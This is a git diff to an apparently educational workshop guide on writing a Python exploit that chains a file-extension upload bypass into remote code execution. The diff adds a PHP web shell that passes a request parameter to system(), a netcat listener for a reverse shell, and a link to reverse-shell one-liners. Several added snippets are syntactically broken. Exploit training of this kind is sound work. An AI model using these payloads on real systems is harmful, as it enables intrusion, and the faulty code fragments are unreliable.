@@ -19,6 +19,7 @@ Vulnerable Code : https://gist.github.com/dreamcast65/1d7fd96893d70d4c85e649b358
 
 ## File Upload
 * File Extension Bypass Cheat Sheet - https://book.hacktricks.xyz/pentesting-web/file-upload
+* One Line Reverse Shells to input into a webshell - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 While it may be beneficial to test for other types of file extension bypasses the bypass we will use for this workshop will be .php.png
 
@@ -58,6 +59,26 @@ This will be used for parsing arguments.
 
 # Time To Code
 
+	#!/usr/bin/python
+	import sys
+	import argparse
+	import pyfiglet
+	import requests
+	import time
+	import subprocess
+	proxies={
+	'http':'http://127.0.0.1:8081'
+	}
+	banner = pyfiglet.figlet_format("Optiv Source Zero Con")
+	print(banner)
+	print('Chained RCE exploit')
+	print('JuggleMe v 0.1.0')
+
+	loaded_file = "shell.php.png"
+	files = {'image':(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd =($_REQUEST['cmd']);system($cmd);echo \"</pre>\";die;}?>")
+	}
+	class Exploit:
+
 ## def __init__ 
 A Sample class with __init__ method.  This is similar to a constructor in C++ and Java and will help with our arguments.
     
@@ -75,6 +96,18 @@ A Sample class with __init__ method.  This is similar to a constructor in C++ an
     p.say_hi() 
 ## def exploitation(self):
 ### Session - Requests
+
+Conditional Statements and Time
+
+It may be good to add conditional statements to see if the request was a success or not. Putting a pause in between requests as well.
+
+	if(r.status_code = 200)
+		print("Success");
+	else
+		print("Fail");
+		quit()
+	time.sleep
+	
 Variables
 	
 	variables ={
@@ -106,6 +139,12 @@ It may be beneficial to add proxies to the POST requests if you'd like to interc
 ### Reverse Shell and Listener
 
 	listener = subprocess.Popen(["nc", "-nvlp", self.localport])
+Now that the listener is started run a GET request to execute a one line reverse shell.  After that Get request you can have the listener wait.  If it doesn't work, you can terminate the listener.
+	
+	listener.wait()
+OR
+
+	listener.terminate()
 	
 ## def get_args():
 
@@ -113,5 +152,15 @@ It may be beneficial to add proxies to the POST requests if you'd like to interc
 	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP') //add all arguments you will need
 	args= parser.parse_args()
 	return args
+	
+## Execution
+	
+	args = get_args()
+	target_ip = args.url // map whatever arguments to variables to plug into our exploit class
+	
+	exp = Exploit(target_ip, other_args)
+	exp.exploitation()
+	
+
 ## Solution Script
 JuggleMe.py - https://github.com/dreamcast65/JuggleMe/blob/main/JuggleMe.py
